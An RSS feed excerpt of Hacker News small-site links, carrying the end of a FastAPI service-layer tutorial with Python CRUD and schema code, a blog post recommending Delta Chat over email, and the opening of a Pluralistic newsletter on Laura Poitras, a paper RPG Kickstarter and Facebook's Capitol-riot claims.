<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        foo_item </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooCRUD(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db).create_item(item)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">not</span><span data-v-3d5c50e8=""> foo_item:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(AppException.FooCreateItem())</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(foo_item)</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">get_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> item_id</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">int</span><span data-v-3d5c50e8="">) -&gt; ServiceResult:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">        foo_item </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooCRUD(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db).get_item(item_id)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">not</span><span data-v-3d5c50e8=""> foo_item:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(AppException.FooGetItem({</span><span data-v-3d5c50e8="">"item_id"</span><span data-v-3d5c50e8="">: item_id}))</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">11</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">not</span><span data-v-3d5c50e8=""> foo_item.public:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">12</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(AppException.FooItemRequiresAuth())</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">13</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(foo_item)</span></span></code></pre></div>
<h2 id="data-access-layer--database-operations" data-v-3d5c50e8="">Data Access Layer – Database Operations</h2>
<p data-v-3d5c50e8="">CRUD helper methods perform operations on the database and are subclassing <code data-v-3d5c50e8="">AppCRUD</code>. The database session is passed down from the <code data-v-3d5c50e8="">AppService</code> instance. These methods are atomic and only concerned with operating on the database. They do not contain any business logic.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooCRUD(AppCRUD)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">create_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> item</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> FooItemCreate</span><span data-v-3d5c50e8="">) -&gt; FooItem:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        foo_item </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooItem(</span><span data-v-3d5c50e8="">description</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">item.description, </span><span data-v-3d5c50e8="">public</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">item.public)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db.add(foo_item)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db.commit()</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db.refresh(foo_item)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> foo_item</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">get_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> item_id</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">int</span><span data-v-3d5c50e8="">) -&gt; FooItem:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">        foo_item </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db.query(FooItem).filter(FooItem.id </span><span data-v-3d5c50e8="">==</span><span data-v-3d5c50e8=""> item_id).first()</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> foo_item:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">11</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> foo_item</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">12</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">None</span></span></code></pre></div>
<p data-v-3d5c50e8="">Pydantic "schemas" or models are defined in the <code data-v-3d5c50e8="">schemas</code> package. They contain mainly two different kinds of data models. First, those expected from clients as request data (route parameters in route method definitions). Second, those expected to be returned to clients as response data (defined in response_model parameter of route definitions).</p>
<p data-v-3d5c50e8="">Additionally, it's possible to model any kind of data being passed inbetween the layers of the app (controller, service and data-access).</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooItemBase(BaseModel)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    description: </span><span data-v-3d5c50e8="">str</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooItemCreate(FooItemBase)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">    public: </span><span data-v-3d5c50e8="">bool</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooItem(FooItemBase)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">id</span><span data-v-3d5c50e8="">: </span><span data-v-3d5c50e8="">int</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> Config</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">        orm_mode </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">True</span></span></code></pre></div>
<p data-v-3d5c50e8="">SQLAlchemy models are defined in the <code data-v-3d5c50e8="">models</code> package. They define how data is stored within the relational database. They are referenced from <code data-v-3d5c50e8="">AppCRUD</code>. If needed, make sure to differentiate between <code data-v-3d5c50e8="">FooItem</code> models (SQLAlchemy) and <code data-v-3d5c50e8="">FooItem</code> schemas (Pydantic) by appropriate import namespacing.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooItem(Base)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    __tablename__ </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"foo_items"</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">id</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Column(Integer, </span><span data-v-3d5c50e8="">primary_key</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">True</span><span data-v-3d5c50e8="">, </span><span data-v-3d5c50e8="">index</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">True</span><span data-v-3d5c50e8="">)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">    description </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Column(String)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">    public </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Column(Boolean, </span><span data-v-3d5c50e8="">default</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">False</span><span data-v-3d5c50e8="">)</span></span></code></pre></div>
<h2 id="exception-handling" data-v-3d5c50e8="">Exception Handling</h2>
<p data-v-3d5c50e8="">App exceptions are implemented in the <code data-v-3d5c50e8="">utils</code> package. First, <code data-v-3d5c50e8="">AppExceptionCase</code> is subclassed from base <code data-v-3d5c50e8="">Exception</code> and includes various attributes for defining custom app exception scenarios. The exception handler with the task of handling custom app exceptions (added to <code data-v-3d5c50e8="">main</code>, see above) is defined with a response containing information about the app exception.</p>
<div data-v-3d5c50e8=""><div data-v-594b4fde="" data-v-3d5c50e8=""><pre data-v-594b4fde=""><span data-v-594b4fde=""><span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span><span data-v-594b4fde=""><span data-v-594b4fde="">utils ›</span></span><span data-v-594b4fde="">app_exceptions.py</span></span></pre></div><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> AppExceptionCase(</span><span data-v-3d5c50e8="">Exception</span><span data-v-3d5c50e8="">)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__init__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> status_code</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">int</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> context</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">dict</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.</span><span data-v-3d5c50e8="">__class__</span><span data-v-3d5c50e8="">.</span><span data-v-3d5c50e8="">__name__</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.status_code </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> status_code</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.context </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> context</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__str__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> (</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">f</span><span data-v-3d5c50e8="">"&lt;AppException </span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8=""> - "</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">+</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">f</span><span data-v-3d5c50e8="">"status_code=</span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.status_code</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8=""> - context=</span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.context</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8="">&gt;"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">        )</span></span>


<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">11</span><span data-v-3d5c50e8="">async</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">app_exception_handler</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">request</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> Request</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> exc</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> AppExceptionCase</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">12</span><span data-v-3d5c50e8="">    </span>…</span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://camillovisini.com/article/abstracting-fastapi-services/">https://camillovisini.com/article/abstracting-fastapi-services/</a></em></p>]]>
            </description>
            <link>https://camillovisini.com/article/abstracting-fastapi-services/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25797140</guid>
            <pubDate>Fri, 15 Jan 2021 22:03:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Email is the messenger you should migrate to]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25796836">thread link</a>) | @type0
<br/>
January 15, 2021 | https://jlelse.blog/posts/email-messenger-delta-chat | <a href="https://web.archive.org/web/*/https://jlelse.blog/posts/email-messenger-delta-chat">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><data value="https://jlelse.blog/posts/email-messenger-delta-chat"></data><div><p>Published on <time datetime="2021-01-14T17:23:36+01:00">January 14, 2021</time> in <a href="https://jlelse.blog/posts">✍️ Posts</a></p></div><div><p>Today I have heard again a discussion about WhatsApp, Telegram, Signal and Threema and there was the question to which messenger one would switch from WhatsApp.</p><p>While I find Telegram very pleasant as an everyday messenger, since it offers me the best user experience and also has some features (bots, channels) that other messengers don’t have, <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Delta Chat came to mind again</a>.</p><p>Everyone has an email address, email is decentralized and Delta Chat encrypts messages automatically.</p><blockquote><p>What I really like about this is, that using the existing email infrastructure enables everyone to communicate with each other without the restriction to use the same messenger or client. Anyone can choose any client and can still be connected. Just login with your usual email account. You don’t even need to use one of those messaging optimized clients and stay with your regular email client.</p><p>– <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Jan-Lukas Else (2019)</a></p></blockquote><p>I installed <a href="https://delta.chat/" target="_blank" rel="noopener">Delta Chat</a> on my smartphone again today. While the app wasn’t quite mature 2 years ago, I have to say it’s pretty decent now. The Android app seems to be based on the Signal interface. But Delta Chat is also available for desktops (Windows, macOS and Linux) and iOS. And the best part - something Signal, Threema and WhatsApp have problems with - Delta Chat can be used from multiple devices without any problems.</p><p>But the most important thing: Delta Chat allows you to communicate even with people who don’t use Delta Chat at all, all you need is an email address! If you write to someone without Delta Chat, they will just get a normal email. I would argue that even beats Matrix or XMPP.</p><p>Conclusion: If you are concerned about security when chatting and would rather use a decentralized messenger (no silo), you are in good hands with email and Delta Chat.</p><p>However, it would be advisable not to use Gmail, Outlook or GMX as email service, but a reasonable email service. I use <a href="https://www.servercow.de/mailcow?lang=en" target="_blank" rel="noopener">mailcow</a> for example, where just today there was <a href="https://mailcow.email/2021/01/14/back-to-the-future-with-delta-chat/" target="_blank" rel="noopener">an announcement about Delta Chat</a>.</p></div><p><b>Tags</b>:
<a rel="tag" href="https://jlelse.blog/tags/delta-chat">Delta Chat</a>
<a rel="tag" href="https://jlelse.blog/tags/email">Email</a>
<a rel="tag" href="https://jlelse.blog/tags/messenger">Messenger</a>
<a rel="tag" href="https://jlelse.blog/tags/opinion">Opinion</a></p></article></div></div>]]>
            </description>
            <link>https://jlelse.blog/posts/email-messenger-delta-chat</link>
            <guid isPermaLink="false">hacker-news-small-sites-25796836</guid>
            <pubDate>Fri, 15 Jan 2021 21:34:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Machine learning is a honeypot for phrenologists]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25796815">thread link</a>) | @samizdis
<br/>
January 15, 2021 | https://pluralistic.net/2021/01/15/hoover-calling/#phrenology | <a href="https://web.archive.org/web/*/https://pluralistic.net/2021/01/15/hoover-calling/#phrenology">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1764">
	<!-- .entry-header -->

	
	
	<div>
		<p><!--
Tags:
phrenology, junk science, facial recognition, Michal Kosinski, disney, disneyland, disneyland at a stroll, business, annual passholders, tesla, intangibles, financialization, eff, fbi, monument toppling, streisand effect, laura poitras, first look, whistleblowers, reality winner, kickstarter, rpgs, dandd, games, sheryl sandberg, facebook, disingenuous, mexico, yugoslavia, music, old school,

Summary:
Laura Poitras fired from First Look; Kickstarting a pad of "Tiny Paper Dungeons"; Facebook says it's the best henhouse fox; I was investigated by the FBI; Yugoslavia's Cold War obsession with Mexican music; Machine learning is a honeypot for phrenologists; Disneyland kills annual passes; Tesla's valuation is 1600x its profitability

URL:
https://pluralistic.net/2021/01/15/hoover-calling/

Title:
Pluralistic: 15 Jan 2021 hoover-calling

Bullet:
🍪

Separator:
_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_

Top Sources:
Today's top sources: Boing Boing (https://boingboing.net), Naked Capitalism (https://www.nakedcapitalism.com/). 

--><br>
<a href="https://pluralistic.net/2021/01/15/hoover-calling/"><img src="https://i1.wp.com/craphound.com/images/15Jan2021.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/craphound.com/images/15Jan2021.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>

<ul>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#poitras">Laura Poitras fired from First Look</a>: She says it's because she spoke out on Reality Winner.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#procedural-rpg">Kickstarting a pad of "Tiny Paper Dungeons"</a>: Procedural paper adventures for your pocket.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#hens-need-foxes">Facebook says it's the best henhouse fox</a>: Only we can stop Qanon.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#g-man">I was investigated by the FBI</a>: It took 20 years!
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#yu-mex">Yugoslavia's Cold War obsession with Mexican music</a>: Nonaligned Yumex gave us Celovečernji the Kid.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#phrenology">Machine learning is a honeypot for phrenologists</a>: "AI" researchers just can't put away the fucking calipers.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#disney-dash">Disneyland kills annual passes</a>: No more Disney at a stroll.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#intangibles">Tesla's valuation is 1600x its profitability</a>: Finacialization, in green and white.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#retro">This day in history</a>: 2006, 2016, 2020
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/15/hoover-calling/#bragsheet">Colophon</a>: Recent publications, upcoming/recent appearances, current writing projects, current reading
</li>
</ul>

<hr>
<p><a name="poitras"></a><br>
<img src="https://i0.wp.com/craphound.com/images/Laura_Poitras_2014.jpeg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/Laura_Poitras_2014.jpeg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Seven years ago, the Academy-Award-winning documentarian Laura Poitras co-founded First Look Media, and its subsidiaries/sister companies The Intercept and Field of Vision.</p>
<p>Late last year, they fired her.</p>
<p>Poitras has published a lengthy letter about her dismissal in which she says that she was fired for publicly criticizing The Intercept's handling of the Reality Winner leaks – an incident that ended with Winner in federal prison for five years.</p>
<p><a href="https://www.praxisfilms.org/open-letter-from-laura-poitras/">https://www.praxisfilms.org/open-letter-from-laura-poitras/</a></p>
<p>The Intercept investigated its handling of the Winner leaks, and concluded that it made mistakes. But Poitras says that the internal investigation was never independent, and allowed people who were implicated in the failures to oversee the postmortem on those failures.</p>
<p>First Look says Poitras's dismissal was "natural," and the result of her "stepping away" from her duties at the company to do "her own projects."</p>
<p><a href="https://www.washingtonpost.com/lifestyle/media/laura-poitras-fired-intercept-first-look-reality-winner/2021/01/14/478a9c30-55e7-11eb-a08b-f1381ef3d207_story.html">https://www.washingtonpost.com/lifestyle/media/laura-poitras-fired-intercept-first-look-reality-winner/2021/01/14/478a9c30-55e7-11eb-a08b-f1381ef3d207_story.html</a></p>
<p>I have an interest here. I have sincere, deep admiration for Poitras. I contributed to the program book for her one-woman show at the Whitney, reported out a Snowden leak with her team, and one of my proudest moments was the cameo my book HOMELAND got in her doc CITIZENFOUR.</p>
<p>And I have worked with First Look; I worked for months on a video project with them, and then they optioned my novella UNAUTHORIZED BREAD. Everyone I've worked with there was bright, committed, passionate and good at their jobs.</p>
<p>Despite all that, I have no personal knowledge of any of the underlying facts.</p>
<p>Here's what I do know, though: Laura Poitras is one of the bravest, most talented filmmakers and journalists I know. She is both a good person and very good at what she does.</p>
<p>And I also know that The Intercept publishes some of the best investigative journalism today. Their work has been hugely important to me and my understanding of the world. Not a day goes by that I don't learn something profound from its work.</p>
<p>When you put those two facts together, here's what you get: profound sadness. A media entity that means a lot to me has fired one of their best journalists, who also helped found the organization. This is not a good day. Poitras's work is critical to this ghastly moment.</p>
<p>First Look is much poorer without her.</p>
<p>(<i>Image: <a href="https://commons.wikimedia.org/wiki/File:Laura_Poitras_2014.jpg">Katy Scoggin</a>, <a href="https://creativecommons.org/licenses/by/3.0/deed.en">CC BY</a></i>)</p>
<hr>
<p><a name="procedural-rpg"></a><br>
<img src="https://i0.wp.com/craphound.com/images/b62fc0f542fa242d4180c29b4533b15e_original.png?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/b62fc0f542fa242d4180c29b4533b15e_original.png?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>There came a point in my life as an RPG player where I largely stopped playing the games in favor of mostly thinking about the games, handling the materials, and reading the rulebooks.</p>
<p>The physicality of D&amp;D was always the most important part for me: the dice, the tables, the minis, the maps. I love me a D&amp;D object.</p>
<p>So I've backed "Tiny Paper Dungeons," Tom Brinton's Kickstarter campaign for a pocket-steno-pad-sized book of procedurally generated RPGs.</p>
<p><a href="https://www.kickstarter.com/projects/brintown/tiny-paper-dungeons/">https://www.kickstarter.com/projects/brintown/tiny-paper-dungeons/</a></p>
<p>Brinton's little game-book includes 50 dungeon maps that you play with a pencil and a D6, acquiring items and leveling up your stats.</p>
<p>The games are generated with Drawbot, and each pad is unique:</p>
<p><a href="https://www.drawbot.com/">https://www.drawbot.com/</a></p>
<p>The pads are printed in Utah, $5 each, for delivery in April. Brindle's done this stuff before and seems confident he can deliver (assuming covid doesn't shut down his printer).</p>
<p>As to gameplay, he says, "I'm trying to strip this genre down to its simplest form: 1 player, simple mechanics, no story-telling, just you, a die and pencil, and a series of simple decisions in the face of randomness."</p>
<p>I ordered two.</p>
<hr>
<p><a name="hens-need-foxes"></a><br>
<img src="https://i0.wp.com/craphound.com/images/Henhouse_near_Ganthorpe_-_geograph.org.uk_-_670026.jpeg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/Henhouse_near_Ganthorpe_-_geograph.org.uk_-_670026.jpeg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>A monopolist's first preference is not to be regulated.</p>
<p>A monopolist's second preference is to be regulated in a way that only it can comply with – and that none of its competitors can comply with.</p>
<p>Oh, hai, Facebook COO Sheryl Sandberg!</p>
<p>"I think [the insurrection was] largely organized on platforms that don’t have our abilities to stop hate, and don’t have our standards, and don’t have our transparency."</p>
<p><a href="https://twitter.com/therecount/status/1348721745688211460">https://twitter.com/therecount/status/1348721745688211460</a></p>
<p>Translation: make rules that ban all the smaller platforms that compete with us, otherwise Qanon-addled musketfuckers will hogtie Congress with zip-cuffs and execute them under the Capitol Dome.</p>
<p>Even if that was true (and to be clear, <em>it is not true</em>), it would be a terrible idea.</p>
<p>But (again): <em>it's not true</em>.</p>
<p>"Facebook played a much larger role than Sandberg suggested."</p>
<p><a href="https://www.washingtonpost.com/technology/2021/01/13/facebook-role-in-capitol-protest/">https://www.washingtonpost.com/technology/2021/01/13/facebook-role-in-capitol-protest/</a></p>
<ul>
<li>128,000 people used FB discuss the rally, many planned their trip using it
</li>
<li>
<p>24+ GOP politicians used FB to organize buses to the event</p>
</li>
</ul>
<p>Oh, and despite claiming otherwise FB STILL hasn't shut down election disinformation groups:</p>
<p><a href="https://www.buzzfeednews.com/article/janelytvynenko/stop-the-steal-facebook">https://www.buzzfeednews.com/article/janelytvynenko/stop-the-steal-facebook</a></p>
